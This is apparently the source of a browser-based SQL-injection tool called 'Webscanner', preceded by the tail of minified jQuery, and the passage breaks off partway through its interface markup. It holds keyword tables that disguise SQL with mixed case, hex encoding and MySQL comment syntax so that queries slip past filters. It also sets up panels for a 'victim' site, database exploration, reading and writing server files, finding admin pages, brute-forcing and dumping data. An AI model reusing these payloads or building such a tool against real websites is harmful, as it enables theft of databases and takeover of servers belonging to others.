q=0.01":""):d.accepts["*"]);for(u in d.headers)v.setRequestHeader(u,d.headers[u]);if(d.beforeSend&&(d.beforeSend.call(e,v,d)===!1||s===2)){v.abort();return!1}for(u in{success:1,error:1,complete:1})v[u](d[u]);p=b$(bU,d,c,v);if(!p)w(-1,"No Transport");else{v.readyState=1,t&&g.trigger("ajaxSend",[v,d]),d.async&&d.timeout>0&&(q=setTimeout(function(){v.abort("timeout")},d.timeout));try{s=1,p.send(l,w)}catch(z){if(s<2)w(-1,z);else throw z}}return v},param:function(a,c){var d=[],e=function(a,b){b=f.isFunction(b)?b():b,d[d.length]=encodeURIComponent(a)+"="+encodeURIComponent(b)};c===b&&(c=f.ajaxSettings.traditional);if(f.isArray(a)||a.jquery&&!f.isPlainObject(a))f.each(a,function(){e(this.name,this.value)});else for(var g in a)ca(g,a[g],c,e);return d.join("&").replace(bD,"+")}}),f.extend({active:0,lastModified:{},etag:{}});var cd=f.now(),ce=/(\=)\?(&|$)|\?\?/i;f.ajaxSetup({jsonp:"callback",jsonpCallback:function(){return f.expando+"_"+cd++}}),f.ajaxPrefilter("json jsonp",function(b,c,d){var e=b.contentType==="application/x-www-form-urlencoded"&&typeof b.data=="string";if(b.dataTypes[0]==="jsonp"||b.jsonp!==!1&&(ce.test(b.url)||e&&ce.test(b.data))){var g,h=b.jsonpCallback=f.isFunction(b.jsonpCallback)?b.jsonpCallback():b.jsonpCallback,i=a[h],j=b.url,k=b.data,l="$1"+h+"$2";b.jsonp!==!1&&(j=j.replace(ce,l),b.url===j&&(e&&(k=k.replace(ce,l)),b.data===k&&(j+=(/\?/.test(j)?"&":"?")+b.jsonp+"="+h))),b.url=j,b.data=k,a[h]=function(a){g=[a]},d.always(function(){a[h]=i,g&&f.isFunction(i)&&a[h](g[0])}),b.converters["script json"]=function(){g||f.error(h+" was not called");return g[0]},b.dataTypes[0]="json";return"script"}}),f.ajaxSetup({accepts:{script:"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},contents:{script:/javascript|ecmascript/},converters:{"text script":function(a){f.globalEval(a);return a}}}),f.ajaxPrefilter("script",function(a){a.cache===b&&(a.cache=!1),a.crossDomain&&(a.type="GET",a.global=!1)}),f.ajaxTransport("script",function(a){if(a.crossDomain){var d,e=c.head||c.getElementsByTagName("head")[0]||c.documentElement;return{send:function(f,g){d=c.createElement("script"),d.async="async",a.scriptCharset&&(d.charset=a.scriptCharset),d.src=a.url,d.onload=d.onreadystatechange=function(a,c){if(c||!d.readyState||/loaded|complete/.test(d.readyState))d.onload=d.onreadystatechange=null,e&&d.parentNode&&e.removeChild(d),d=b,c||g(200,"success")},e.insertBefore(d,e.firstChild)},abort:function(){d&&d.onload(0,1)}}}});var cf=a.ActiveXObject?function(){for(var a in ch)ch[a](0,1)}:!1,cg=0,ch;f.ajaxSettings.xhr=a.ActiveXObject?function(){return!this.isLocal&&ci()||cj()}:ci,function(a){f.extend(f.support,{ajax:!!a,cors:!!a&&"withCredentials"in a})}(f.ajaxSettings.xhr()),f.support.ajax&&f.ajaxTransport(function(c){if(!c.crossDomain||f.support.cors){var d;return{send:function(e,g){var h=c.xhr(),i,j;c.username?h.open(c.type,c.url,c.async,c.username,c.password):h.open(c.type,c.url,c.async);if(c.xhrFields)for(j in c.xhrFields)h[j]=c.xhrFields[j];c.mimeType&&h.overrideMimeType&&h.overrideMimeType(c.mimeType),!c.crossDomain&&!e["X-Requested-With"]&&(e["X-Requested-With"]="XMLHttpRequest");try{for(j in e)h.setRequestHeader(j,e[j])}catch(k){}h.send(c.hasContent&&c.data||null),d=function(a,e){var j,k,l,m,n;try{if(d&&(e||h.readyState===4)){d=b,i&&(h.onreadystatechange=f.noop,cf&&delete ch[i]);if(e)h.readyState!==4&&h.abort();else{j=h.status,l=h.getAllResponseHeaders(),m={},n=h.responseXML,n&&n.documentElement&&(m.xml=n),m.text=h.responseText;try{k=h.statusText}catch(o){k=""}!j&&c.isLocal&&!c.crossDomain?j=m.text?200:404:j===1223&&(j=204)}}}catch(p){e||g(-1,p)}m&&g(j,k,m,l)},!c.async||h.readyState===4?d():(i=++cg,cf&&(ch||(ch={},f(a).unload(cf)),ch[i]=d),h.onreadystatechange=d)},abort:function(){d&&d(0,1)}}}});var ck={},cl,cm,cn=/^(?:toggle|show|hide)$/,co=/^([+\-]=)?([\d+.\-]+)([a-z%]*)$/i,cp,cq=[["height","marginTop","marginBottom","paddingTop","paddingBottom"],["width","marginLeft","marginRight","paddingLeft","paddingRight"],["opacity"]],cr;f.fn.extend({show:function(a,b,c){var d,e;if(a||a===0)return this.animate(cu("show",3),a,b,c);for(var g=0,h=this.length;g<h;g++)d=this[g],d.style&&(e=d.style.display,!f._data(d,"olddisplay")&&e==="none"&&(e=d.style.display=""),e===""&&f.css(d,"display")==="none"&&f._data(d,"olddisplay",cv(d.nodeName)));for(g=0;g<h;g++){d=this[g];if(d.style){e=d.style.display;if(e===""||e==="none")d.style.display=f._data(d,"olddisplay")||""}}return this},hide:function(a,b,c){if(a||a===0)return this.animate(cu("hide",3),a,b,c);var d,e,g=0,h=this.length;for(;g<h;g++)d=this[g],d.style&&(e=f.css(d,"display"),e!=="none"&&!f._data(d,"olddisplay")&&f._data(d,"olddisplay",e));for(g=0;g<h;g++)this[g].style&&(this[g].style.display="none");return this},_toggle:f.fn.toggle,toggle:function(a,b,c){var d=typeof a=="boolean";f.isFunction(a)&&f.isFunction(b)?this._toggle.apply(this,arguments):a==null||d?this.each(function(){var b=d?a:f(this).is(":hidden");f(this)[b?"show":"hide"]()}):this.animate(cu("toggle",3),a,b,c);return this},fadeTo:function(a,b,c,d){return this.filter(":hidden").css("opacity",0).show().end().animate({opacity:b},a,c,d)},animate:function(a,b,c,d){function g(){e.queue===!1&&f._mark(this);var b=f.extend({},e),c=this.nodeType===1,d=c&&f(this).is(":hidden"),g,h,i,j,k,l,m,n,o;b.animatedProperties={};for(i in a){g=f.camelCase(i),i!==g&&(a[g]=a[i],delete a[i]),h=a[g],f.isArray(h)?(b.animatedProperties[g]=h[1],h=a[g]=h[0]):b.animatedProperties[g]=b.specialEasing&&b.specialEasing[g]||b.easing||"swing";if(h==="hide"&&d||h==="show"&&!d)return b.complete.call(this);c&&(g==="height"||g==="width")&&(b.overflow=[this.style.overflow,this.style.overflowX,this.style.overflowY],f.css(this,"display")==="inline"&&f.css(this,"float")==="none"&&(!f.support.inlineBlockNeedsLayout||cv(this.nodeName)==="inline"?this.style.display="inline-block":this.style.zoom=1))}b.overflow!=null&&(this.style.overflow="hidden");for(i in a)j=new f.fx(this,b,i),h=a[i],cn.test(h)?(o=f._data(this,"toggle"+i)||(h==="toggle"?d?"show":"hide":0),o?(f._data(this,"toggle"+i,o==="show"?"hide":"show"),j[o]()):j[h]()):(k=co.exec(h),l=j.cur(),k?(m=parseFloat(k[2]),n=k[3]||(f.cssNumber[i]?"":"px"),n!=="px"&&(f.style(this,i,(m||1)+n),l=(m||1)/j.cur()*l,f.style(this,i,l+n)),k[1]&&(m=(k[1]==="-="?-1:1)*m+l),j.custom(l,m,n)):j.custom(l,h,""));return!0}var e=f.speed(b,c,d);if(f.isEmptyObject(a))return this.each(e.complete,[!1]);a=f.extend({},a);return e.queue===!1?this.each(g):this.queue(e.queue,g)},stop:function(a,c,d){typeof a!="string"&&(d=c,c=a,a=b),c&&a!==!1&&this.queue(a||"fx",[]);return this.each(function(){function h(a,b,c){var e=b[c];f.removeData(a,c,!0),e.stop(d)}var b,c=!1,e=f.timers,g=f._data(this);d||f._unmark(!0,this);if(a==null)for(b in g)g[b]&&g[b].stop&&b.indexOf(".run")===b.length-4&&h(this,g,b);else g[b=a+".run"]&&g[b].stop&&h(this,g,b);for(b=e.length;b--;)e[b].elem===this&&(a==null||e[b].queue===a)&&(d?e[b](!0):e[b].saveState(),c=!0,e.splice(b,1));(!d||!c)&&f.dequeue(this,a)})}}),f.each({slideDown:cu("show",1),slideUp:cu("hide",1),slideToggle:cu("toggle",1),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"},fadeToggle:{opacity:"toggle"}},function(a,b){f.fn[a]=function(a,c,d){return this.animate(b,a,c,d)}}),f.extend({speed:function(a,b,c){var d=a&&typeof a=="object"?f.extend({},a):{complete:c||!c&&b||f.isFunction(a)&&a,duration:a,easing:c&&b||b&&!f.isFunction(b)&&b};d.duration=f.fx.off?0:typeof d.duration=="number"?d.duration:d.duration in f.fx.speeds?f.fx.speeds[d.duration]:f.fx.speeds._default;if(d.queue==null||d.queue===!0)d.queue="fx";d.old=d.complete,d.complete=function(a){f.isFunction(d.old)&&d.old.call(this),d.queue?f.dequeue(this,d.queue):a!==!1&&f._unmark(this)};return d},easing:{linear:function(a,b,c,d){return c+d*a},swing:function(a,b,c,d){return(-Math.cos(a*Math.PI)/2+.5)*d+c}},timers:[],fx:function(a,b,c){this.options=b,this.elem=a,this.prop=c,b.orig=b.orig||{}}}),f.fx.prototype={update:function(){this.options.step&&this.options.step.call(this.elem,this.now,this),(f.fx.step[this.prop]||f.fx.step._default)(this)},cur:function(){if(this.elem[this.prop]!=null&&(!this.elem.style||this.elem.style[this.prop]==null))return this.elem[this.prop];var a,b=f.css(this.elem,this.prop);return isNaN(a=parseFloat(b))?!b||b==="auto"?0:b:a},custom:function(a,c,d){function h(a){return e.step(a)}var e=this,g=f.fx;this.startTime=cr||cs(),this.end=c,this.now=this.start=a,this.pos=this.state=0,this.unit=d||this.unit||(f.cssNumber[this.prop]?"":"px"),h.queue=this.options.queue,h.elem=this.elem,h.saveState=function(){e.options.hide&&f._data(e.elem,"fxshow"+e.prop)===b&&f._data(e.elem,"fxshow"+e.prop,e.start)},h()&&f.timers.push(h)&&!cp&&(cp=setInterval(g.tick,g.interval))},show:function(){var a=f._data(this.elem,"fxshow"+this.prop);this.options.orig[this.prop]=a||f.style(this.elem,this.prop),this.options.show=!0,a!==b?this.custom(this.cur(),a):this.custom(this.prop==="width"||this.prop==="height"?1:0,this.cur()),f(this.elem).show()},hide:function(){this.options.orig[this.prop]=f._data(this.elem,"fxshow"+this.prop)||f.style(this.elem,this.prop),this.options.hide=!0,this.custom(this.cur(),0)},step:function(a){var b,c,d,e=cr||cs(),g=!0,h=this.elem,i=this.options;if(a||e>=i.duration+this.startTime){this.now=this.end,this.pos=this.state=1,this.update(),i.animatedProperties[this.prop]=!0;for(b in i.animatedProperties)i.animatedProperties[b]!==!0&&(g=!1);if(g){i.overflow!=null&&!f.support.shrinkWrapBlocks&&f.each(["","X","Y"],function(a,b){h.style["overflow"+b]=i.overflow[a]}),i.hide&&f(h).hide();if(i.hide||i.show)for(b in i.animatedProperties)f.style(h,b,i.orig[b]),f.removeData(h,"fxshow"+b,!0),f.removeData(h,"toggle"+b,!0);d=i.complete,d&&(i.complete=!1,d.call(h))}return!1}i.duration==Infinity?this.now=e:(c=e-this.startTime,this.state=c/i.duration,this.pos=f.easing[i.animatedProperties[this.prop]](this.state,c,0,1,i.duration),this.now=this.start+(this.end-this.start)*this.pos),this.update();return!0}},f.extend(f.fx,{tick:function(){var a,b=f.timers,c=0;for(;c<b.length;c++)a=b[c],!a()&&b[c]===a&&b.splice(c--,1);b.length||f.fx.stop()},interval:13,stop:function(){clearInterval(cp),cp=null},speeds:{slow:600,fast:200,_default:400},step:{opacity:function(a){f.style(a.elem,"opacity",a.now)},_default:function(a){a.elem.style&&a.elem.style[a.prop]!=null?a.elem.style[a.prop]=a.now+a.unit:a.elem[a.prop]=a.now}}}),f.each(["width","height"],function(a,b){f.fx.step[b]=function(a){f.style(a.elem,b,Math.max(0,a.now)+a.unit)}}),f.expr&&f.expr.filters&&(f.expr.filters.animated=function(a){return f.grep(f.timers,function(b){return a===b.elem}).length});var cw=/^t(?:able|d|h)$/i,cx=/^(?:body|html)$/i;"getBoundingClientRect"in c.documentElement?f.fn.offset=function(a){var b=this[0],c;if(a)return this.each(function(b){f.offset.setOffset(this,a,b)});if(!b||!b.ownerDocument)return null;if(b===b.ownerDocument.body)return f.offset.bodyOffset(b);try{c=b.getBoundingClientRect()}catch(d){}var e=b.ownerDocument,g=e.documentElement;if(!c||!f.contains(g,b))return c?{top:c.top,left:c.left}:{top:0,left:0};var h=e.body,i=cy(e),j=g.clientTop||h.clientTop||0,k=g.clientLeft||h.clientLeft||0,l=i.pageYOffset||f.support.boxModel&&g.scrollTop||h.scrollTop,m=i.pageXOffset||f.support.boxModel&&g.scrollLeft||h.scrollLeft,n=c.top+l-j,o=c.left+m-k;return{top:n,left:o}}:f.fn.offset=function(a){var b=this[0];if(a)return this.each(function(b){f.offset.setOffset(this,a,b)});if(!b||!b.ownerDocument)return null;if(b===b.ownerDocument.body)return f.offset.bodyOffset(b);var c,d=b.offsetParent,e=b,g=b.ownerDocument,h=g.documentElement,i=g.body,j=g.defaultView,k=j?j.getComputedStyle(b,null):b.currentStyle,l=b.offsetTop,m=b.offsetLeft;while((b=b.parentNode)&&b!==i&&b!==h){if(f.support.fixedPosition&&k.position==="fixed")break;c=j?j.getComputedStyle(b,null):b.currentStyle,l-=b.scrollTop,m-=b.scrollLeft,b===d&&(l+=b.offsetTop,m+=b.offsetLeft,f.support.doesNotAddBorder&&(!f.support.doesAddBorderForTableAndCells||!cw.test(b.nodeName))&&(l+=parseFloat(c.borderTopWidth)||0,m+=parseFloat(c.borderLeftWidth)||0),e=d,d=b.offsetParent),f.support.subtractsBorderForOverflowNotVisible&&c.overflow!=="visible"&&(l+=parseFloat(c.borderTopWidth)||0,m+=parseFloat(c.borderLeftWidth)||0),k=c}if(k.position==="relative"||k.position==="static")l+=i.offsetTop,m+=i.offsetLeft;f.support.fixedPosition&&k.position==="fixed"&&(l+=Math.max(h.scrollTop,i.scrollTop),m+=Math.max(h.scrollLeft,i.scrollLeft));return{top:l,left:m}},f.offset={bodyOffset:function(a){var b=a.offsetTop,c=a.offsetLeft;f.support.doesNotIncludeMarginInBodyOffset&&(b+=parseFloat(f.css(a,"marginTop"))||0,c+=parseFloat(f.css(a,"marginLeft"))||0);return{top:b,left:c}},setOffset:function(a,b,c){var d=f.css(a,"position");d==="static"&&(a.style.position="relative");var e=f(a),g=e.offset(),h=f.css(a,"top"),i=f.css(a,"left"),j=(d==="absolute"||d==="fixed")&&f.inArray("auto",[h,i])>-1,k={},l={},m,n;j?(l=e.position(),m=l.top,n=l.left):(m=parseFloat(h)||0,n=parseFloat(i)||0),f.isFunction(b)&&(b=b.call(a,c,g)),b.top!=null&&(k.top=b.top-g.top+m),b.left!=null&&(k.left=b.left-g.left+n),"using"in b?b.using.call(a,k):e.css(k)}},f.fn.extend({position:function(){if(!this[0])return null;var a=this[0],b=this.offsetParent(),c=this.offset(),d=cx.test(b[0].nodeName)?{top:0,left:0}:b.offset();c.top-=parseFloat(f.css(a,"marginTop"))||0,c.left-=parseFloat(f.css(a,"marginLeft"))||0,d.top+=parseFloat(f.css(b[0],"borderTopWidth"))||0,d.left+=parseFloat(f.css(b[0],"borderLeftWidth"))||0;return{top:c.top-d.top,left:c.left-d.left}},offsetParent:function(){return this.map(function(){var a=this.offsetParent||c.body;while(a&&!cx.test(a.nodeName)&&f.css(a,"position")==="static")a=a.offsetParent;return a})}}),f.each(["Left","Top"],function(a,c){var d="scroll"+c;f.fn[d]=function(c){var e,g;if(c===b){e=this[0];if(!e)return null;g=cy(e);return g?"pageXOffset"in g?g[a?"pageYOffset":"pageXOffset"]:f.support.boxModel&&g.document.documentElement[d]||g.document.body[d]:e[d]}return this.each(function(){g=cy(this),g?g.scrollTo(a?f(g).scrollLeft():c,a?c:f(g).scrollTop()):this[d]=c})}}),f.each(["Height","Width"],function(a,c){var d=c.toLowerCase();f.fn["inner"+c]=function(){var a=this[0];return a?a.style?parseFloat(f.css(a,d,"padding")):this[d]():null},f.fn["outer"+c]=function(a){var b=this[0];return b?b.style?parseFloat(f.css(b,d,a?"margin":"border")):this[d]():null},f.fn[d]=function(a){var e=this[0];if(!e)return a==null?null:this;if(f.isFunction(a))return this.each(function(b){var c=f(this);c[d](a.call(this,b,c[d]()))});if(f.isWindow(e)){var g=e.document.documentElement["client"+c],h=e.document.body;return e.document.compatMode==="CSS1Compat"&&g||h&&h["client"+c]||g}if(e.nodeType===9)return Math.max(e.documentElement["client"+c],e.body["scroll"+c],e.documentElement["scroll"+c],e.body["offset"+c],e.documentElement["offset"+c]);if(a===b){var i=f.css(e,d),j=parseFloat(i);return f.isNumeric(j)?j:i}return this.css(d,typeof a=="string"?a:a+"px")}}),a.jQuery=a.$=f,typeof define=="function"&&define.amd&&define.amd.jQuery&&define("jquery",[],function(){return f})})(window);
/***********************************************************
	Webscanner source code
************************************************************/
$(document).ready(function(){
IMG = new Array();
//0.nut xoay
IMG.push('data:image/gif;base64,R0lGODlhEAAQAPIAAERERP///29vb83Nzf///7a2tp6enpOTkyH+GkNyZWF0ZWQgd2l0aCBhamF4bG9hZC5pbmZvACH5BAAKAAAAIf8LTkVUU0NBUEUyLjADAQAAACwAAAAAEAAQAAADMwi63P4wyklrE2MIOggZnAdOmGYJRbExwroUmcG2LmDEwnHQLVsYOd2mBzkYDAdKa+dIAAAh+QQACgABACwAAAAAEAAQAAADNAi63P5OjCEgG4QMu7DmikRxQlFUYDEZIGBMRVsaqHwctXXf7WEYB4Ag1xjihkMZsiUkKhIAIfkEAAoAAgAsAAAAABAAEAAAAzYIujIjK8pByJDMlFYvBoVjHA70GU7xSUJhmKtwHPAKzLO9HMaoKwJZ7Rf8AYPDDzKpZBqfvwQAIfkEAAoAAwAsAAAAABAAEAAAAzMIumIlK8oyhpHsnFZfhYumCYUhDAQxRIdhHBGqRoKw0R8DYlJd8z0fMDgsGo/IpHI5TAAAIfkEAAoABAAsAAAAABAAEAAAAzIIunInK0rnZBTwGPNMgQwmdsNgXGJUlIWEuR5oWUIpz8pAEAMe6TwfwyYsGo/IpFKSAAAh+QQACgAFACwAAAAAEAAQAAADMwi6IMKQORfjdOe82p4wGccc4CEuQradylesojEMBgsUc2G7sDX3lQGBMLAJibufbSlKAAAh+QQACgAGACwAAAAAEAAQAAADMgi63P7wCRHZnFVdmgHu2nFwlWCI3WGc3TSWhUFGxTAUkGCbtgENBMJAEJsxgMLWzpEAACH5BAAKAAcALAAAAAAQABAAAAMyCLrc/jDKSatlQtScKdceCAjDII7HcQ4EMTCpyrCuUBjCYRgHVtqlAiB1YhiCnlsRkAAAOwAAAAAAAAAAAA%3D%3D');
//1.nut sucess
IMG.push('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAKfSURBVDjLpZPrS1NhHMf9O3bOdmwDCWREIYKEUHsVJBI7mg3FvCxL09290jZj2EyLMnJexkgpLbPUanNOberU5taUMnHZUULMvelCtWF0sW/n7MVMEiN64AsPD8/n83uucQDi/id/DBT4Dolypw/qsz0pTMbj/WHpiDgsdSUyUmeiPt2+V7SrIM+bSss8ySGdR4abQQv6lrui6VxsRonrGCS9VEjSQ9E7CtiqdOZ4UuTqnBHO1X7YXl6Daa4yGq7vWO1D40wVDtj4kWQbn94myPGkCDPdSesczE2sCZShwl8CzcwZ6NiUs6n2nYX99T1cnKqA2EKui6+TwphA5k4yqMayopU5mANV3lNQTBdCMVUA9VQh3GuDMHiVcLCS3J4jSLhCGmKCjBEx0xlshjXYhApfMZRP5CyYD+UkG08+xt+4wLVQZA1tzxthm2tEfD3JxARH7QkbD1ZuozaggdZbxK5kAIsf5qGaKMTY2lAU/rH5HW3PLsEwUYy+YCcERmIjJpDcpzb6l7th9KtQ69fi09ePUej9l7cx2DJbD7UrG3r3afQHOyCo+V3QQzE35pvQvnAZukk5zL5qRL59jsKbPzdheXoBZc4saFhBS6AO7V4zqCpiawuptwQG+UAa7Ct3UT0hh9p9EnXT5Vh6t4C22QaUDh6HwnECOmcO7K+6kW49DKqS2DrEZCtfuI+9GrNHg4fMHVSO5kE7nAPVkAxKBxcOzsajpS4Yh4ohUPPWKTUh3PaQEptIOr6BiJjcZXCwktaAGfrRIpwblqOV3YKdhfXOIvBLeREWpnd8ynsaSJoyESFphwTtfjN6X1jRO2+FxWtCWksqBApeiFIR9K6fiTpPiigDoadqCEag5YUFKl6Yrciw0VOlhOivv/Ff8wtn0KzlebrUYwAAAABJRU5ErkJggg%3D%3D');
//2.nut error
IMG.push('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAALEgAACxIB0t1+/AAAABx0RVh0U29mdHdhcmUAQWRvYmUgRmlyZXdvcmtzIENTM5jWRgMAAAAVdEVYdENyZWF0aW9uIFRpbWUAMi8xNy8wOCCcqlgAAAQRdEVYdFhNTDpjb20uYWRvYmUueG1wADw/eHBhY2tldCBiZWdpbj0iICAgIiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+Cjx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDQuMS1jMDM0IDQ2LjI3Mjk3NiwgU2F0IEphbiAyNyAyMDA3IDIyOjExOjQxICAgICAgICAiPgogICA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczp4YXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iPgogICAgICAgICA8eGFwOkNyZWF0b3JUb29sPkFkb2JlIEZpcmV3b3JrcyBDUzM8L3hhcDpDcmVhdG9yVG9vbD4KICAgICAgICAgPHhhcDpDcmVhdGVEYXRlPjIwMDgtMDItMTdUMDI6MzY6NDVaPC94YXA6Q3JlYXRlRGF0ZT4KICAgICAgICAgPHhhcDpNb2RpZnlEYXRlPjIwMDgtMDMtMjRUMTk6MDA6NDJaPC94YXA6TW9kaWZ5RGF0ZT4KICAgICAgPC9yZGY6RGVzY3JpcHRpb24+CiAgICAgIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiCiAgICAgICAgICAgIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyI+CiAgICAgICAgIDxkYzpmb3JtYXQ+aW1hZ2UvcG5nPC9kYzpmb3JtYXQ+CiAgICAgIDwvcmRmOkRlc2NyaXB0aW9uPgogICA8L3JkZjpSREY+CjwveDp4bXBtZXRhPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDUdUmQAAAD5SURBVDiNpZMxagMxEEWfgiCXcB3IbXwD7zbaM0nNyjdIl1O4Dk7pbsslEFbEZFKsJsiJrGDy4YM0M//zRyAoINAJyB8cS43RwwIdMFrvaeE8DADxXqQ3Jstn6GaQ5L3M0GQxsyaZoJtA3r2XCS6o+FkvZkdOIG/eywl+UVHrqcYm4BNIjb1rPdXYBTivj3gVtZ5q/p8gAfPhcLOBamzKcW41UI1dgA/qez4bU6muUE0zwVYEgKeKkWruEnTHENg4R8pFZblCyY1zHEMgQTQAe9gB8cE5XkO4GhugmIk76L+z+Wzy6FzT4CWLXf5MF8upSdMB4gC9Xr4AiezTJHGxdq0AAAAASUVORK5CYII%3D');

var URL={};
var VTM = {
request:"get",
method:"union",
type:"mysql",
bypass:"none",
sleep: 3,
offset: 50,
limit: 15
};
var SQL = {
"none":{
	select:"SELeCT",
	concat:"cOncat",
	union:"UniOn",
	information_schema:"infOrmaTion_sChEma",
	schemata:"schEmAtA",
	tables:"tAblEs",
	columns:"cOlumNS",
	limit:"liMit",
	from:"FrOm",
	where:"wHeRe",
	group_concat:"grOuP_cOncat",
	table_name:"tAblE_nAmE",
	column_name:"colUmn_naMe",
	schema_name:"sChEma_nAme",
	table_schema:"taBle_schEmA",
	unhex_hex:"uNhEx(hEX",
	load_file:"loAd_fIle",
	dumpfile:"duMpFiLe",
	outfile:"oUtfIle",
	into:"iNTo",
	and:"aNd",
	order:"oRdEr",
	by:"bY",
	as:"aS",
	ascii:"aScIi",
	substring:"sUbsTrinG",
	database: "daTabAse()",
	exists:"eXiSts"
},
"hex":{
	select:"SE%4ceCT",
	concat:"cO%6ecat",
	union:"Un%69On",
	information_schema:"infOrm%61Tion_sC%68Ema",
	schemata:"schE%6dAtA",
	tables:"tAb%6cEs",
	columns:"cOl%75mNS",
	limit:"l%69Mit",
	from:"Fr%4fm",
	where:"wHe%52e",
	group_concat:"grO%75P_cOn%63at",
	table_name:"tA%62lE_nA%6dE",
	column_name:"co%6cUmn_n%61Me",
	schema_name:"sCh%45ma_nA%6de",
	table_schema:"ta%42le_s%63hEmA",
	unhex_hex:"uN%68Ex(hE%58",
	load_file:"l%6fAd_fI%6ce",
	dumpfile:"du%4dpFiLe",
	outfile:"oUt%66Ile",
	into:"iN%54o",
	and:"a%4ed",
	order:"oR%64Er",
	by:"%62Y",
	as:"a%53",
	ascii:"aS%63Ii",
	substring:"sUb%73Tr%69nG",
	database: "daT%61bAse()",
	exists:"eX%69Sts"
},
"quote":{
	select:"/*!SE%4ceCT*/",
	concat:"cO%6ecat",
	union:"/*!Un%69On*/",
	information_schema:"/*!infOrm%61Tion_sC%68Ema*/",
	schemata:"/*!schE%6dAtA*/",
	tables:"/*!tAb%6cEs*/",
	columns:"/*!cOl%75mNS*/",
	limit:"/*!l%69Mit*/",
	from:"/*!Fr%4fm*/",
	where:"/*!wHe%52e*/",
	group_concat:"grO%75P_cOn%63at",
	table_name:"/*!tA%62lE_nA%6dE*/",
	column_name:"/*!co%6cUmn_n%61Me*/",
	schema_name:"/*!sCh%45ma_nA%6de*/",
	table_schema:"/*!ta%42le_s%63hEmA*/",
	unhex_hex:"uN%68Ex(hE%58",
	load_file:"l%6fAd_fI%6ce",
	dumpfile:"du%4dpFiLe",
	outfile:"oUt%66Ile",
	into:"/*!iN%54o*/",
	and:"/*!a%4ed*/",
	order:"/*!oR%64Er*/",
	by:"/*!%62Y*/",
	as:"/*!a%53*/",
	ascii:"aS%63Ii",
	substring:"sUb%73Tr%69nG",
	database: "/*!daT%61bAse()*/",
	exists:"eX%69Sts"
},
space:"+",// ,%0b
start:"#SQL#",
stop:"#LQS#",
mid:"#QSL#",
ErrorChar:["Duplicate entry '","' for key"],
Data:"",
limit:15
};
var DATA = {
database:"",
dbhandler:"",
tbhandler:"",
table:"",
columns:{},
count:0
};
var TMP = {
lfid:0,
requestnum: 0
};

var head = "<title>[+]scanning : "+document.domain+"</title>\
<style>\
td{\
font-size: 13px;\
}\
a,a:hover{\
color: #FFF;\
text-decoration: none;\
}\
body {\
    background: none repeat scroll 0 0 #424242;\
    color: #FFFFFF;\
    font-size: 13px;\
    margin: 0 auto;\
    padding: 0;\
    text-align: center;\
	width: 95%\
}\
.button {\
    background: none repeat scroll 0 0 #333;\
	border: 1px solid #555;\
    margin: 3px;\
    padding: 5px 20px;\
    text-align: center;\
	border-radius: 5px 5px 5px 5px;\
	float: left;\
}\
.button:hover {\
	border: 1px solid #111;\
	-moz-box-shadow: 0 0 5px #222;\
	-webkit-box-shadow: 0 0 5px #222;\
	box-shadow: 0 0 5px #222;\
	cursor: pointer;\
}\
#menu{\
	height: 35px;\
}\
#submain,#victim{\
	width: 100%;\
	text-align: center;\
	border: 1px solid #333333;\
	float:left;\
}\
#head,.head{\
	background: none repeat scroll 0 0 #333;\
	padding: 5px 25px;\
	border-radius: 5px 5px 0px 0px;\
	border: 1px solid #555555;\
}\
.explore{\
	\
	width: 33%;\
	margin: 0;\
	border-radius: 5px 5px 5px 5px;\
	border: 1px solid #555;\
	text-align: center;\
	float: left;\
	overflow: hidden;\
}\
#body{\
	height: 200px;\
	 overflow: auto;\
}\
.active,textarea{\
	background: none repeat scroll 0 0 #3A3A3A;\
    border: 1px solid #333333;\
    border-radius: 3px 3px 3px 3px;\
    margin: 2px;\
    padding: 3px 8px;\
    text-align: left;\
	color: #fff\
}\
.clcheck{\
	float: left;\
    width: 25px;\
}\
table{\
	text-align: left;\
}\
.hidden{\
	display: none;\
}\
.tbname{\
	margin-left: 30px;	\
}\
.clname{\
	margin-left: 60px;	\
}\
#dboption .button{\
	float: none;\
}\
.dbselected{\
	background-color: #585 !important\
}\
.tbselected{\
	background-color: #FF5555 !important;\
}\
</style>";

$("head").html(head);

var body = "\
<div id='main'>\
	<div id='menu' style='display: inline;'></div>\
	<div id='victim'></div>\
	<div id='submain'>\
		<div id='database' alt='Explore DB'></div>\
		<div id='loadfile' alt='LoadFile'></div>\
		<div id='writefile' alt='WriteFile'></div>\
		<div id='adminlink' alt='Link Admin' hiddenvictim='1'></div>\
		<div id='bruteforce' alt='Brute Force' hiddenvictim='1'></div>\
		<div id='datadumper' alt='Dumper'></div>\
	</div>\
</div>\
<div id='tmp' class='hidden'></div>\
<div id='alert' class='hidden'>\
	<div id='bg' style='position: fixed; height: 100%; width: 100%; top: 0px; left: 0px; opacity: 0.8; background-color: rgb(51, 51, 51);'></div>\
